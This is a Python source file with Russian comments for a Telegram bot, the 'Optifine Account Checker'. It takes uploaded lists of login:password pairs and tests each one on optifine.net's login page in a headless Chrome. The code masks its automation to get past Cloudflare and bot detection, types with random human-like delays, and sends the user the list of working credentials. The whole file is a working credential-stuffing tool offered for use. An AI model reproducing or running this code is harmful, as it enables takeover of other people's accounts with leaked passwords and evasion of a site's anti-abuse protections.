import os
import logging
import asyncio
import aiofiles
import time
import random
from datetime import datetime
from typing import Dict, List, Tuple

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

class OptifineChecker:
    """Проверка аккаунтов на Optifine.net с обходом Cloudflare"""
    
    def __init__(self):
        self.driver = None
        self.options = None
    
    def setup_driver(self):
        """Настройка Chrome с ПОЛНЫМ отключением безопасности"""
        chrome_options = Options()
        
        # === ОСНОВНЫЕ НАСТРОЙКИ ДЛЯ RALWAY ===
        chrome_options.add_argument('--headless=new')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        
        # === ПОЛНОЕ ОТКЛЮЧЕНИЕ БЕЗОПАСНОСТИ ===
        chrome_options.add_argument('--disable-web-security')
        chrome_options.add_argument('--disable-features=VizDisplayCompositor')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_argument('--disable-blink-features')
        chrome_options.add_argument('--ignore-certificate-errors')
        chrome_options.add_argument('--ignore-ssl-errors')
        chrome_options.add_argument('--allow-running-insecure-content')
        chrome_options.add_argument('--disable-webgl')
        chrome_options.add_argument('--disable-software-rasterizer')
        chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
        chrome_options.add_argument('--disable-site-isolation-trials')
        
        # === МАСКИРОВКА ПОД РЕАЛЬНОГО ПОЛЬЗОВАТЕЛЯ ===
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        
        # === ОТКЛЮЧАЕМ ВСЕ, ЧТО МОЖЕТ ВЫДАВАТЬ БОТА ===
        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation', 'enable-logging'])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_experimental_option('detach', True)
        
        # === ДОПОЛНИТЕЛЬНЫЕ НАСТРОЙКИ ДЛЯ СТАБИЛЬНОСТИ ===
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-notifications')
        chrome_options.add_argument('--disable-popup-blocking')
        chrome_options.add_argument('--disable-default-apps')
        chrome_options.add_argument('--disable-sync')
        chrome_options.add_argument('--disable-translate')
        chrome_options.add_argument('--disable-client-side-phishing-detection')
        chrome_options.add_argument('--disable-hang-monitor')
        chrome_options.add_argument('--disable-prompt-on-repost')
        chrome_options.add_argument('--disable-logging')
        chrome_options.add_argument('--log-level=3')
        chrome_options.add_argument('--silent')
        
        # === НАСТРОЙКИ ДЛЯ ПРОПУСКА CAPTCHA И ПРОВЕРОК ===
        chrome_options.add_argument('--disable-component-update')
        chrome_options.add_argument('--disable-background-networking')
        chrome_options.add_argument('--disable-sync')
        chrome_options.add_argument('--disable-default-apps')
        chrome_options.add_argument('--disable-client-side-phishing-detection')
        
        # Путь к ChromeDriver
        chromedriver_path = '/usr/local/bin/chromedriver'
        if not os.path.exists(chromedriver_path):
            chromedriver_path = '/usr/bin/chromedriver'
        
        try:
            service = Service(chromedriver_path)
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            
            # Дополнительная маскировка через JavaScript
            self.driver.execute_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                window.chrome = {runtime: {}};
                Object.defineProperty(navigator, 'platform', {get: () => 'Win32'});
            """)
            
            logger.info("✅ Chrome запущен с полным отключением безопасности")
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка запуска Chrome: {e}")
            return False
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка одного аккаунта на Optifine.net"""
        
        if not self.driver:
            if not self.setup_driver():
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Chrome не запустился'
                }
        
        # Проверяем что драйвер жив
        try:
            self.driver.current_url
        except:
            logger.warning("⚠️ Драйвер умер, перезапускаю...")
            self.close()
            if not self.setup_driver():
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Не могу перезапустить Chrome'
                }
        
        try:
            logger.info(f"🔍 Проверяю: {login[:20]}...")
            
            # 1. Сначала заходим на главную для получения кук
            self.driver.get('https://optifine.net')
            time.sleep(random.uniform(2, 4))
            
            # 2. Идем на страницу входа
            self.driver.get('https://optifine.net/login')
            
            # Ждем загрузку с запасом времени для Cloudflare
            WebDriverWait(self.driver, 20).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Имитация человеческого поведения
            time.sleep(random.uniform(3, 5))
            
            # Делаем скриншот для отладки (можно убрать)
            # self.driver.save_screenshot(f"debug_{login[:10]}.png")
            
            # 3. Ищем форму входа
            try:
                # Поле логина - расширенный поиск
                login_input = None
                login_selectors = [
                    "input[name='username']",
                    "input[name='email']",
                    "input[type='text']",
                    "#username",
                    "#email",
                    "input[name='login']",
                    "input[placeholder*='username' i]",
                    "input[placeholder*='email' i]",
                    "input[placeholder*='login' i]",
                    "input[id*='user']",
                    "input[id*='login']",
                    "input[name*='user']",
                    "input[name*='login']"
                ]
                
                for selector in login_selectors:
                    try:
                        login_input = WebDriverWait(self.driver, 5).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                        logger.info(f"✅ Найдено поле логина по селектору: {selector}")
                        break
                    except:
                        continue
                
                if not login_input:
                    # Пробуем найти через XPath
                    try:
                        login_input = self.driver.find_element(By.XPATH, "//input[@type='text' or @type='email']")
                        logger.info("✅ Найдено поле логина через XPath")
                    except:
                        pass
                
                if not login_input:
                    logger.warning("❌ Не найдено поле логина")
                    return {
                        'login': login,
                        'status': 'error',
                        'error': 'Не найдено поле логина'
                    }
                
                # Поле пароля
                password_input = None
                password_selectors = [
                    "input[name='password']",
                    "input[type='password']",
                    "#password",
                    "#pass",
                    "input[id*='pass']",
                    "input[name*='pass']",
                    "input[placeholder*='password' i]"
                ]
                
                for selector in password_selectors:
                    try:
                        password_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                        logger.info(f"✅ Найдено поле пароля по селектору: {selector}")
                        break
                    except:
                        continue
                
                if not password_input:
                    # Пробуем через XPath
                    try:
                        password_input = self.driver.find_element(By.XPATH, "//input[@type='password']")
                        logger.info("✅ Найдено поле пароля через XPath")
                    except:
                        pass
                
                if not password_input:
                    logger.warning("❌ Не найдено поле пароля")
                    return {
                        'login': login,
                        'status': 'error',
                        'error': 'Не найдено поле пароля'
                    }
                
                # Кнопка входа
                submit_button = None
                button_selectors = [
                    "button[type='submit']",
                    "input[type='submit']",
                    ".login-button",
                    "#login",
                    "button:contains('Login')",
                    "button:contains('Sign in')",
                    "button:contains('Войти')",
                    "input[value*='Login']",
                    "input[value*='Sign in']"
                ]
                
                for selector in button_selectors:
                    try:
                        submit_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                        logger.info(f"✅ Найдена кнопка по селектору: {selector}")
                        break
                    except:
                        continue
                
                # 4. Вводим данные как человек
                login_input.clear()
                for char in login:
                    login_input.send_keys(char)
                    time.sleep(random.uniform(0.05, 0.1))
                
                time.sleep(random.uniform(0.5, 1))
                
                password_input.clear()
                for char in password:
                    password_input.send_keys(char)
                    time.sleep(random.uniform(0.05, 0.1))
                
                time.sleep(random.uniform(0.5, 1))
                
                # 5. Отправляем форму
                if submit_button:
                    submit_button.click()
                else:
                    # Если кнопка не найдена, пробуем Enter
                    password_input.submit()
                
                # 6. Ждем результат с запасом времени
                time.sleep(random.uniform(5, 7))
                
                # 7. Проверяем результат
                current_url = self.driver.current_url
                page_source = self.driver.page_source.lower()
                page_title = self.driver.title.lower()
                
                # Сохраняем для отладки
                logger.info(f"URL после входа: {current_url}")
                logger.info(f"Title: {page_title}")
                
                # Расширенные критерии успешного входа
                success_indicators = [
                    'dashboard' in current_url,
                    'profile' in current_url,
                    'account' in current_url,
                    'my-account' in current_url,
                    'logout' in page_source,
                    'log out' in page_source,
                    'welcome' in page_source,
                    'successfully logged in' in page_source,
                    'login successful' in page_source,
                    'logged in as' in page_source,
                    'my profile' in page_title,
                    'account' in page_title,
                    'profile' in page_title,
                    '/account' in current_url,
                    '/profile' in current_url,
                    '/dashboard' in current_url
                ]
                
                if any(success_indicators):
                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                    return {
                        'login': login,
                        'password': password,
                        'status': 'valid'
                    }
                
                # Критерии ошибки
                error_indicators = [
                    'invalid' in page_source,
                    'incorrect' in page_source,
                    'wrong' in page_source,
                    'error' in page_source,
                    'failed' in page_source,
                    'not found' in page_source,
                    'does not exist' in page_source,
                    'login failed' in page_source,
                    'authentication failed' in page_source
                ]
                
                if any(error_indicators):
                    logger.info(f"❌ Неверный: {login[:20]}")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Неверный логин/пароль'
                    }
                
                # Если все еще на странице входа
                if 'login' in current_url:
                    logger.info(f"❌ Остался на странице входа: {login[:20]}")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Остался на странице входа'
                    }
                
                # Если непонятно - считаем невалидным
                logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Не удалось определить'
                }
                
            except NoSuchElementException as e:
                logger.error(f"Элемент не найден: {e}")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Страница изменилась'
                }
            
        except TimeoutException:
            logger.error("Таймаут загрузки страницы - возможно Cloudflare")
            return {
                'login': login,
                'status': 'error',
                'error': 'Таймаут (Cloudflare?)'
            }
        except WebDriverException as e:
            logger.error(f"Ошибка WebDriver: {e}")
            self.close()
            return {
                'login': login,
                'status': 'error',
                'error': 'Chrome упал'
            }
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }
    
    def close(self):
        """Закрытие браузера"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None

# Создаем экземпляр
checker = OptifineChecker()

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    
    results = {
        'valid': [],
        'invalid': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🚀 **Запускаю проверку Optifine.net...**\n"
        "⏳ Пожалуйста, подождите"
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            for sep in [':', ';', '|', '\t']:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        
        start_time = time.time()
        
        for i, (login, password) in enumerate(accounts, 1):
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            result = await checker.check_account(login, password)
            
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            await asyncio.sleep(random.uniform(2, 3))  # Случайная задержка
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        if results['invalid']:
            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                for acc in results['invalid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
                )
            os.remove(invalid_file)
        
        if results['errors']:
            error_file = f"⚠️_ОШИБКИ_{len(results['errors'])}шт_{timestamp}.txt"
            async with aiofiles.open(error_file, 'w', encoding='utf-8') as f:
                for acc in results['errors']:
                    await f.write(f"{acc['login']}:{acc['password']} | {acc.get('error', 'unknown')}\n")
            
            with open(error_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=error_file,
                    caption=f"⚠️ **Ошибок: {len(results['errors'])}**"
                )
            os.remove(error_file)
        
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• ❌ Нерабочих: {len(results['invalid'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Account Checker**\n\n"
        f"🔍 Проверяет аккаунты на optifine.net\n"
        f"🛡️ **Полное отключение безопасности**\n"
        f"🤖 **Обход Cloudflare**\n\n"
        f"📥 Отправь .txt файл с логинами и паролями\n"
        f"Формат: логин:пароль\n\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего проверено: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 **Пример:**\n"
            "`user@mail.com:password123`\n"
            "`player123:qwerty456`\n\n"
            "⚡️ **Результат:**\n"
            "• ✅ рабочие аккаунты\n"
            "• ❌ нерабочие аккаунты\n"
            "• ⚠️ ошибки проверки\n\n"
            "🛡️ **Режим:** Полное отключение безопасности + обход Cloudflare"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 10 МБ**")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Запускаю проверку с полным отключением безопасности...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER")
    print("🛡️ РЕЖИМ: ПОЛНОЕ ОТКЛЮЧЕНИЕ БЕЗОПАСНОСТИ")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    finally:
        checker.close()

if __name__ == '__main__':
    main()